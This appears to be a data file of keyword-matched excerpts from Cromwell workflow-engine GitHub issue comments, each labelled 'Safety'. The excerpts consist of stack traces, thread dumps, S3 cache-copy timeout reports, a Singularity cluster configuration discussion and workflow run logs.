Safety,core.internal.http.pipeline.stages.HandleResponseStage.handleErrorResponse(HandleResponseStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execut,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1379,Timeout,TimeoutExceptionHandlingStage,1379,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:3065,Timeout,TimeoutException,3065,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['Timeout'],['TimeoutException']
Safety,d:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:99961,unsafe,unsafeRunAsync,99961,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeRunAsync']
Safety,e$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.effect.IO.unsafeToFuture(IO.scala:328); cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anonfun$1.$anonfun$applyOrElse$1(MaterializeWorkflowDescriptorActor.scala:146); scala.concurrent.Future.$anonfun$flatMap$1(Future.scala:303); scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:100006,unsafe,unsafeToFuture,100006,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['unsafe'],['unsafeToFuture']
Safety,"e, some small files <100GB were able to be successfully cached. However, with Cromwell v53, even a 6GB result file got a problem of caching and has to rerun. Is there any way to prevent the timeout of the actor? . > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491:1394,Timeout,TimeoutException,1394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-725311491,1,['Timeout'],['TimeoutException']
Safety,"e/properties.py"", line 1501, in _GetProperty; value = _GetPropertyWithoutDefault(prop, properties_file); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 1539, in _GetPropertyWithoutDefault; value = callback(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/properties.py"", line 693, in _GetGCEProject; return c_gce.Metadata().Project(); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 104, in Project; gce_read.GOOGLE_GCE_METADATA_PROJECT_URI); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/util/retry.py"", line 155, in TryFunc; return func(*args, **kwargs), None; File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce.py"", line 41, in _ReadNoProxyWithCleanFailures; return gce_read.ReadNoProxy(uri); File ""/usr/local/share/google/google-cloud-sdk/lib/googlecloudsdk/core/credentials/gce_read.py"", line 50, in ReadNoProxy; request, timeout=timeout_property).read(); File ""/usr/lib/python2.7/urllib2.py"", line 401, in open; response = self._open(req, data); File ""/usr/lib/python2.7/urllib2.py"", line 419, in _open; '_open', req); File ""/usr/lib/python2.7/urllib2.py"", line 379, in _call_chain; result = func(*args); File ""/usr/lib/python2.7/urllib2.py"", line 1211, in http_open; return self.do_open(httplib.HTTPConnection, req); File ""/usr/lib/python2.7/urllib2.py"", line 1184, in do_open; r = h.getresponse(buffering=True); File ""/usr/lib/python2.7/httplib.py"", line 1072, in getresponse; response.begin(); File ""/usr/lib/python2.7/httplib.py"", line 408, in begin; version, status, reason = self._read_status(); File ""/usr/lib/python2.7/httplib.py"", line 366, in _read_status; line = self.fp.readline(); File ""/usr/lib/python2.7/socket.py"", line 447, in readline; data = self._sock.recv(self._rbufsize); socket.timeout: timed out; :; ```. This is a gsutil stacktrace. JES tried to copy the logs and failed, hence failing the ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846:2616,timeout,timeout,2616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298751846,1,['timeout'],['timeout']
Safety,ed unexpectedly.; 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor$.StandardException(PipelinesApiAsyncBackendJobExecutionActor.scala:73); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:520); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:527); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:77); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1019); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1015); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:43); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985:1798,recover,recoverWith,1798,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3855#issuecomment-414289985,1,['recover'],['recoverWith']
Safety,"edSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Hikari Housekeeping Timer (pool db)"" #35 daemon prio=5 os_prio=0 tid=0x00007fdaf8212800 nid=0xa0b waiting on condition [0x00007fdb80cd2000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b74b1f0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""Abandoned connection cleanup thread"" #34 daemon prio=5 os_prio=0 tid=0x00007fdaf81fc000 nid=0xa0a in Object.wait() [0x00007fdb80fd3000]; jav",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:4923,Unsafe,Unsafe,4923,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"es} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the Cromwell repo the best way (like this PR), or would it serve better to have a new page in the Cromwell documentation? I'm sure that I (and @illusional if he is able) would be happy to write this up.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1639,avoid,avoid,1639,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['avoid'],['avoid']
Safety,"fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745); ....snip.... ""ForkJoinPool-2-worker-29"" #38 daemon prio=5 os_prio=0 tid=0x00007fdaf4001000 nid=0xa0e waiting on condition [0x00007fdb8073c000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b540500> (a scala.concurrent.forkjoin",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:2392,Unsafe,Unsafe,2392,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"fdaa80c0000 nid=0xa56 waiting on condition [0x00007fda90575000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #94 prio=5 os_prio=0 tid=0x00007fdaa80be800 nid=0xa55 waiting on condition [0x00007fda90676000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-18"" #93 prio=5 os_prio=0 tid=0x00007fdaa80bc800 nid=0xa54 waiting on condition [0x00007fda90777000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x000000015b9a2568> (a java.util.concurrent.locks.AbstractQueuedSynchronizer",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914:1515,Unsafe,Unsafe,1515,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-258913914,1,['Unsafe'],['Unsafe']
Safety,"flow_url_biscayne_sub_wfs (35 seconds, 322 milliseconds); - should successfully run workflow_url_http_relative_imports (35 seconds, 718 milliseconds); - should successfully run workflow_url_square (15 seconds, 152 milliseconds); - should successfully run workflow_url_sub_workflow_hello_world (53 seconds, 160 milliseconds); - should successfully run workflowenginefunctions (45 seconds, 630 milliseconds); - should successfully run writeToCache (1 minute, 15 seconds); - should successfully run write_lines (1 minute, 55 seconds); - should successfully run write_lines_files (3 minutes, 5 seconds); - should successfully run write_tsv (56 seconds, 21 milliseconds); - should NOT call cache the second run of call_cache_hit_prefixes_empty_hint_local !!! IGNORED !!!; - should NOT call cache the second run of call_cache_hit_prefixes_two_roots_empty_hint_cache_miss_papi !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.restart_abort_jes !!! IGNORED !!!; - should abort a workflow mid run and restart immediately abort.restart_abort_tes !!! IGNORED !!!; - should call cache the second run of backendWithNoDocker !!! IGNORED !!!; - should call cache the second run of call_cache_hit_prefixes_empty_hint_papi !!! IGNORED !!!; - should call cache the second run of fofn_caching !!! IGNORED !!!; - should call cache the third run of call_cache_hit_prefixes_two_roots_empty_hint_cache_hit_papi !!! IGNORED !!!; - should fail during execution circular_dependencies !!! IGNORED !!!; - should fail during execution google_labels_bad !!! IGNORED !!!; - should fail during execution gpu_on_papi_invalid !!! IGNORED !!!; - should fail during execution localize_file_larger_than_disk_space !!! IGNORED !!!; - should fail during execution missing_input_failure_papiv1 !!! IGNORED !!!; - should fail during execution missing_input_failure_papiv2 !!! IGNORED !!!; - should fail during execution papi_fail_on_bad_attrs !!! IGNORED !!!; - should fail during execution refresh_token_failu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132:16616,abort,abort,16616,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4992#issuecomment-512361132,2,['abort'],['abort']
Safety,"from - to Running; [2018-11-21 15:09:37,18] [info] AwsBatchAsyncBackendJobExecutionActor [02306258test.hello:NA:1]: Status change from Running to Succeeded; [2018-11-21 15:09:39,33] [info] WorkflowExecutionActor-02306258-436a-4372-ab54-2dcd83c42b47 [02306258]: Workflow test complete. Final Outputs:; {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; }; [2018-11-21 15:09:39,37] [info] WorkflowManagerActor WorkflowActor-02306258-436a-4372-ab54-2dcd83c42b47 is in a terminal state: WorkflowSucceededState; [2018-11-21 15:09:43,77] [info] SingleWorkflowRunnerActor workflow finished with status 'Succeeded'.; {; ""outputs"": {; ""test.hello.response"": ""s3://s4-somaticgenomicsrd-valinor/cromwell-execution/test/02306258-436a-4372-ab54-2dcd83c42b47/call-hello/helloWorld.txt""; },; ""id"": ""02306258-436a-4372-ab54-2dcd83c42b47""; }; [2018-11-21 15:09:44,59] [info] Workflow polling stopped; [2018-11-21 15:09:44,60] [info] Shutting down WorkflowStoreActor - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] Aborting all running workflows.; [2018-11-21 15:09:44,61] [info] Shutting down WorkflowLogCopyRouter - Timeout = 5 seconds; [2018-11-21 15:09:44,61] [info] WorkflowStoreActor stopped; [2018-11-21 15:09:44,61] [info] Shutting down JobExecutionTokenDispenser - Timeout = 5 seconds; [2018-11-21 15:09:44,62] [info] WorkflowLogCopyRouter stopped; [2018-11-21 15:09:44,62] [info] JobExecutionTokenDispenser stopped; [2018-11-21 15:09:44,62] [info] Shutting down WorkflowManagerActor - Timeout = 3600 seconds; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor All workflows finished; [2018-11-21 15:09:44,62] [info] WorkflowManagerActor stopped; [2018-11-21 15:09:44,62] [info] Connection pools shut down; [2018-11-21 15:09:44,62] [info] Shutting down SubWorkflowStoreActor - Timeout = 1800 seconds; [2018-11-21 15:09:44,62] [info] Shutting down JobStoreActor - Timeout = 1800 seconds; [2018-11-21 15",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421:4713,Timeout,Timeout,4713,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4412#issuecomment-440793421,2,"['Abort', 'Timeout']","['Aborting', 'Timeout']"
